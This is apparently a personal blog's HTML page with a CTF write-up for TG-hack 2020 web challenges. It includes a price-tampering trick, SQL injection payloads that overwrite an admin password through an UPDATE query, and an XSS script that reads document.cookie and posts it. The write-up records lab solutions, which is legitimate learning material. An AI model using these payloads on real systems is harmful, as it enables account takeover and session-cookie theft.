@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html>
+  <head><meta name="generator" content="Hexo 3.9.0">
+<meta name="google-site-verification" content="fQ_tfBgNjE9NQcpKnGAkWapHoKuimF5lVuNuqpPXar0">
+    <meta charset="utf-8">
+    
+    <title>TG-hack CTF Write Up | Xiao Leung&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    
+      <link rel="icon" href="/favicon.png">
+    
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="/js/google-code-prettify/tomorrow-night-eighties.min.css">
+
+  </head>
+
+  <body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
+<header>
+
+	<a id="logo" href="/" title="Xiao Leung&#39;s Blog">
+	<img src="/favicon.png" alt="Xiao Leung&#39;s Blog"></a>
+	
+	
+		<!--搜索栏-->
+		<i class="js-toggle-search iconfont icon-search"></i>
+
+
+<form class="js-search search-form search-form--modal" method="get" action="http://gushi.li" role="search">
+	<div class="search-form__inner">
+		<div>
+			<i class="iconfont icon-search"></i>
+			<input class="text-input" placeholder="Enter Key..." type="search">
+		</div>
+	</div>
+</form>
+	
+
+	
+		<!--侧边导航栏-->
+		<a id="nav-toggle" href="#"><span></span></a>
+
+<nav>
+	<div class="menu-top-container">
+		<ul id="menu-top" class="menu">
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.plasf.cn/2019/08/01/HelloWorld/" target="_blank">AboutMe</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.plasf.cn/HXCTF/" target="_blank">HXCTF</a>
+				</li>
+			
+		</ul>
+	</div>
+</nav>
+	
+
+</header>
+
+<div class="m-header ">
+	<section id="hero1" class="hero">
+		<div class="inner">
+		</div>
+	</section>
+	
+		<figure class="top-image" data-enable=true></figure>
+	
+</div>
+
+<!--文章列表-->
+<div class="wrapper">
+  
+    <!--文章-->
+<article>
+	
+  
+    <h1 class="post-title" itemprop="name">
+      TG-hack CTF Write Up
+    </h1>
+  
+
+	<div class='post-body mb'>
+		<h1 id="Tghack-CTF-WP"><a href="#Tghack-CTF-WP" class="headerlink" title="Tghack CTF WP"></a>Tghack CTF WP</h1><h2 id="Redux"><a href="#Redux" class="headerlink" title="Redux"></a>Redux</h2><blockquote>
+<p>Author: <a href="https://tghack.no/authors#12" target="_blank" rel="noopener"><strong>Nora - Norasaurus#8234</strong></a></p>
+<p>Here is your Gaia form to get your weekly plant rations. Complete the form and reap your reward!</p>
+<p><a href="https://redux.tghack.no/" target="_blank" rel="noopener">redux.tghack.no</a></p>
+</blockquote>
+<p>FLAG in a JavaScript File.</p>
+<h2 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h2><blockquote>
+<p>Author: <a href="https://tghack.no/authors#11" target="_blank" rel="noopener"><strong>Roy Olav Purser - roypur#9953</strong></a></p>
+<p>We found the Mother cult merch store. In addition to selling clothing items they sell some secrets we need. For the time being we haven’t been able to secure the funds necessary to do so. Can you help us?</p>
+<ul>
+<li><a href="https://shop.tghack.no/" target="_blank" rel="noopener">shop.tghack.no</a></li>
+</ul>
+</blockquote>
+<p>O-M-G,I regret it very much.😂My friends and I were still discussing last night  about it might have changed the price to negative. I found it could be bought when the id undefined. But I forgot to check it when price to negative.</p>
+<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20200412/15866692758656.png" alt="img"></p>
+<p>We use burp suite to packet capture and change the price to negative .It is very important to change the id to undefined.</p>
+<p>e g:</p>
+<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20200412/15866688491552.png" alt="img"></p>
+<p>And then,it happened that is amazing!We have more money!</p>
+<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20200412/15866691878335.png" alt="img"></p>
+<p>OK，we can buy the flag….</p>
+<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20200412/15866692306869.png" alt="img"></p>
+<h2 id="Bobby"><a href="#Bobby" class="headerlink" title="Bobby"></a>Bobby</h2><blockquote>
+<p> Author: <a href="https://tghack.no/authors#11" target="_blank" rel="noopener"><strong>Roy Olav Purser - roypur#9953</strong></a></p>
+<p>Little bobby forgot his password. Can you help him log in?</p>
+<p><a href="https://bobby.tghack.no/" target="_blank" rel="noopener">bobby.tghack.no</a></p>
+</blockquote>
+<p>I didn’t find any bugs in this container at 1st😭.After a long time,My classmate told me ,it has an SQL injection in the new password param when you change the pass.</p>
+<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20200412/15866718226965.png" alt="img"></p>
+<p>We can know that it’s a update sql and we can control a  param .</p>
+<p>eg:</p>
+<blockquote>
+<p>update table set column=’param’ where ……</p>
+</blockquote>
+<p>1st,I want to commented out “where“ and I write payload like the following . But it can ‘t change passwd and throw me an error…..</p>
+<pre><code>admin&#39;-- &#39; WHERE user=? AND pass=?</code></pre><p><img src="https://www.mycute.cn/static/umeditor/php/upload/20200412/15866726963625.png" alt="img"></p>
+<p>From here we should bind 2 params to this sql.So we change this payload like this:</p>
+<pre><code>admin&#39;,user=? , pass=? -- </code></pre><p><img src="https://www.mycute.cn/static/umeditor/php/upload/20200412/15866730992987.png" alt="img"></p>
+<p>And then , we changed this admin’s pass,we can get flag, when we login.</p>
+<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20200412/15866731884985.png" alt="img"></p>
+<h2 id="Exfiltration"><a href="#Exfiltration" class="headerlink" title="Exfiltration"></a>Exfiltration</h2><blockquote>
+<p>Author: <a href="https://tghack.no/authors#11" target="_blank" rel="noopener"><strong>Roy Olav Purser - roypur#9953</strong></a></p>
+<p>We have found a forum used by members of the Mother cult. The members are sitting behind an advanced firewall without access to the internet. We need their super secret information.</p>
+<p><a href="https://exfiltration.tghack.no/" target="_blank" rel="noopener">exfiltration.tghack.no</a></p>
+</blockquote>
+<pre><code class="javascript">&lt;script&gt;
+let xhr = new XMLHttpRequest();
+xhr.open(&quot;post&quot;, window.location.href, true);
+xhr.send(document.cookie);
+&lt;/script&gt;</code></pre>
+
+	</div>
+	<div class="meta split">
+		
+			<span>本文总阅读量 <span id="busuanzi_value_page_pv"></span> 次</span>
+		
+		<time class="post-date" datetime="2020-04-12T08:00:42.107Z" itemprop="datePublished">2020-04-12</time>
+	</div>
+</article>
+
+<!--评论-->
+
+	
+<div class="ds-thread" data-thread-key="TghackCTFWP" data-title="TG-hack CTF Write Up" data-url="http://www.plasf.cn/2020/04/12/TghackCTFWP/"></div>
+<script type="text/javascript">
+
+var duoshuoQuery = {short_name:"yumemor"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0]
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+</script>
+
+
+  
+</div>
+
+
+  <svg id="bigTriangleColor" width="100%" height="40" viewBox="0 0 100 102" preserveAspectRatio="none">
+    <path d="M0 0 L50 100 L100 0 Z"></path>
+  </svg>
+
+  
+
+
+  <div class="wrapper"></div>
+
+
+
+
+
+<div class="fat-footer">
+	<div class="wrapper">
+		<div class="layout layout--center">
+			<div class="layout__item palm-mb">
+				<div class="media">
+					<img class="headimg" src='/assets/blogImg/litten.png' alt='XiaoLeung'>
+					<div class="media__body">
+						<h4>兵至如归-Xiaoleung&#39;s Blog</h4>
+						<p class='site-description'>Don&#39;t forget why we started</p>
+					</div>
+				</div>
+				<div class="author-contact">
+					<ul>
+						
+							
+							<li>
+				        		<a href="https://github.com/sharpleung" target="_blank">
+				        			
+				        				<i class="iconfont icon-github"></i>
+				        			
+				        		</a>
+				        	</li>
+						
+					</ul>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+<footer class="footer" role="contentinfo">
+	<div class="wrapper wrapper--wide split split--responsive">
+<a href="http://beian.miit.gov.cn/">粤ICP备18132442号-1</a><br>
+<a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=44011202000643" style="display:inline-block;text-decoration:none;height:20px;line-height:20px;"><img src="http://beian.gov.cn/img/ghs.png" style="float:left;"/><p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#939393;">粤公网安备 44011202000643号</p></a><br>
+
+		
+			<span>本站总访问量 <span id="busuanzi_value_site_pv"></span> 次, 访客数 <span id="busuanzi_value_site_uv"></span> 人次</span>
+		
+		<span>Theme by <a href="http://github.com/justpsvm">justpsvm</a>. Powered by <a href="http://hexo.io">Hexo</a></span>
+	</div>
+</footer>
+
+	<!-－这里导入了 lib.js 里面涵盖了 jQuery 等框架 所以注释掉-->
+	<!--<script src="http://lib.sinaapp.com/js/jquery/2.0/jquery.min.js"></script>-->
+	<script src="/js/lib.js"></script>
+	<script src="/js/google-code-prettify/prettify.js"></script>
+	<script src="/js/module.js"></script>
+	<script src="/js/script.js"></script>
+	
+		<script async src="http://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	
+	<script type='text/javascript'>
+		//代码高亮
+		$(document).ready(function(){
+	 		$('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
+   			prettyPrint();
+		});
+	</script>
+	<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+ <script type="text/javascript"> /* 鼠标点击特效 - 7Core.CN */ var a_idx = 0;jQuery(document).ready(function($) {$("body").click(function(e) {var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正" ,"法治", "爱国", "敬业", "诚信", "友善");var $i = $("<span/>").text(a[a_idx]); a_idx = (a_idx + 1) % a.length;var x = e.pageX,y = e.pageY;$i.css({"z-index": 100000000,"top": y - 20,"left": x,"position": "absolute","font-weight": "bold","color": "#ff6651"});$("body").append($i);$i.animate({"top": y - 180,"opacity": 0},1500,function() {$i.remove();});});}); </script>
+
